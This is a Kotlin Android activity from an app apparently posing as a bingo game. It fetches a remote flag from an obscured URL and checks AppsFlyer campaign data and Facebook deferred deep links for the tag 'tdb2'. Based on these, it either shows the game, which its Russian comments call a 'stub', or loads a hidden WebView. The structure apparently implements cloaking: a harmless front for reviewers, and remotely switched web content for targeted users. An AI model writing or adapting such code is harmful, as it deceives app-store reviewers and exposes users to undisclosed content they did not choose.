package com.bigwinlab.bingo

import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.isInvisible
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.bigwinlab.bingo.MAinCla.Companion.AppsFlyerDevKey
import com.bigwinlab.bingo.MAinCla.Companion.CH
import com.bigwinlab.bingo.MAinCla.Companion.G1
import com.bigwinlab.bingo.MAinCla.Companion.H1
import com.bigwinlab.bingo.MAinCla.Companion.fowerhfhc
import com.bigwinlab.bingo.MAinCla.Companion.ovjervncds
import com.bigwinlab.bingo.databinding.ActivityMainBinding
import com.bigwinlab.bingo.game.Gamm
import com.facebook.applinks.AppLinkData
import kotlinx.coroutines.*
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    private lateinit var bindMain: ActivityMainBinding

    var checker: String = "null"
    lateinit var jsoup: String

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMain = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMain.root)
        jsoup = ""
        deePP(this)

        val prefs = getSharedPreferences("ActivityPREF", MODE_PRIVATE)
        if (prefs.getBoolean("activity_exec", false)) {
            //второе включение
            val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
            when (sharPref.getString(CH, "null")) {
                /*
                  Логика второго открытия: пресеты 2 и 3 являются НЕактивными
                  пресет 2 скипает всю логику, кроме дипа, и открывает заглушку
                  пресет 3 скипает всю логику, кроме дипа, и открывает вебвью,
                  этот пресет нужен на случай отключения аппслфаера
                  пресеты nm, dp, org возможны только при пресете 1 в apps.txt
                  эти пресеты нужны для повторного открытия
                */
                "2" -> {
                    skipMe()
                }
                "3" -> {
                    bindMain.progMain.isInvisible = true
                    bindMain.imageMain.isInvisible = true
                    testWV()

                }
                "nm" -> {
                    bindMain.progMain.isInvisible = true
                    bindMain.imageMain.isInvisible = true
                    testWV()
                }
                "dp" -> {
                    bindMain.progMain.isInvisible
                    bindMain.imageMain.isInvisible
                    testWV()
                }
                "org" -> {
                    skipMe()
                }
                else -> {
                    skipMe()
                }
            }

        } else {
            //первое включение
            val exec = prefs.edit()
            exec.putBoolean("activity_exec", true)
            exec.apply()

            val job = GlobalScope.launch(Dispatchers.IO) {
                checker = getCheckCode(fowerhfhc+ovjervncds)
            }
            runBlocking {
                try {
                    job.join()
                } catch (_: Exception){
                }
            }

            when (checker) {
                "1" -> {
                    AppsFlyerLib.getInstance()
                        .init(AppsFlyerDevKey, conversionDataListener, applicationContext)
                    AppsFlyerLib.getInstance().start(this)
                    afNullRecordedOrNotChecker(1500)
                }
                "2" -> {
                    skipMe()
                }
                "3" -> {
                    bindMain.progMain.isInvisible = true
                    bindMain.imageMain.isInvisible = true
                    testWV()
                }

            }
        }
    }



    private suspend fun getCheckCode(link: String): String {
        val url = URL(link)
        val oneStr = "1"
        val twoStr = "2"
        val testStr = "3"
        val activeStrn = "0"
        val urlConnection = withContext(Dispatchers.IO) {
            url.openConnection()
        } as HttpURLConnection

        return try {
            when (val text = urlConnection.inputStream.bufferedReader().readText()) {
                "2" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, twoStr)
                    editor.apply()
                    Log.d("jsoup status", text)
                    twoStr
                }
                "1" -> {
                    Log.d("jsoup status", text)
                    oneStr
                }
                "3" -> {
                    val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
                    val editor = sharPref.edit()
                    editor.putString(CH, testStr)
                    editor.apply()
                    Log.d("jsoup status", text)
                    testStr
                }
                else -> {
                    Log.d("jsoup status", "is null")
                    activeStrn
                }
            }
        } finally {
            urlConnection.disconnect()
        }

    }

    private fun afNullRecordedOrNotChecker(timeInterval: Long): Job {

        val sharPref = getSharedPreferences("SP", MODE_PRIVATE)
        return CoroutineScope(Dispatchers.IO).launch {
            while (NonCancellable.isActive) {
                val hawk1: String? = sharPref.getString(G1, null)
                val hawkdeep: String? = sharPref.getString(H1, "null")
                if (hawk1 != null) {
                    Log.d("TestInUIHawk", hawk1.toString())
                    if(hawk1.contains("tdb2")){
                        Log.d("zero_filter_2", "hawkname received")
                        val editor = sharPref.edit()
                        editor.putString(CH, "nm")
                        editor.apply()
                        testWV()
                    } else if (hawkdeep != null){
                        if(hawkdeep.contains("tdb2"))
                        {
                            Log.d("zero_filter_2", "hawkdeep received")
                            testWV()
                        }
                        else{
                            Log.d("zero_filter_2", "hawkdeep wrong")
                            val editor = sharPref.edit()
                            editor.putString(CH, "org")
                            editor.apply()
                            skipMe()
                        }

                    }
                    break
                } else {
                    val hawk1: String? = sharPref.getString(G1, null)
                    Log.d("TestInUIHawkNulled", hawk1.toString())
                    delay(timeInterval)
                }
            }
        }
    }



    val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
            val editor = sharPref.edit()
            val dataGotten = data?.get("campaign").toString()
            editor.putString(G1, dataGotten)
            editor.apply()
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


    private fun skipMe() {

        Intent(this, Gamm::class.java)
            .also { startActivity(it) }
        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
        finish()
    }
    private fun testWV() {
        bindMain.progMain.isInvisible = true
        bindMain.imageMain.isInvisible = true
        supportFragmentManager.beginTransaction().add(R.id.container, ViewFrag()).commit()
//        Intent(this, Weeeeeb::class.java)
//            .also { startActivity(it) }
//        finish()
    }
    fun deePP(context: Context) {
        val sharPref = applicationContext.getSharedPreferences("SP", MODE_PRIVATE)
        val editor = sharPref.edit()
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val params = appLinkData.targetUri.host
                //тест
                editor.putString(H1,params.toString())
                editor.apply()
                if (params!!.contains("tdb2")){
                    editor.putString(CH, "dp")
                    editor.apply()
                }
            }
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
    }
}